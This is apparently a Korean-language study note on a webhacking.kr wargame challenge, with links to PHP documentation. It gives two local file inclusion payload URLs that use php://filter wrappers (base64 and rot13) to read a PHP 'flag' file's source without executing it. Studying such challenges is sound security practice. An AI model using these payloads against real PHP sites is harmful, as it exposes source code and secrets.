#web-hacking 
```payload
http://webhacking.kr:10001/?file=php://filter/convert.base64-encode/resource=flag
http://webhacking.kr:10001/?file=php://filter/string.rot13/resource=flag
```
- file schema
- php 실행하지 않고 그대로 내용을 가져와야 함
- LFI 취약점과 연관이 있다.
- 관련 사이트
	- https://www.php.net/manual/en/filters.convert.php
	- https://www.dottak.me/1964af8a-50ca-800b-9c3f-da340bfa9b5d
	- https://www.php.net/manual/en/wrappers.php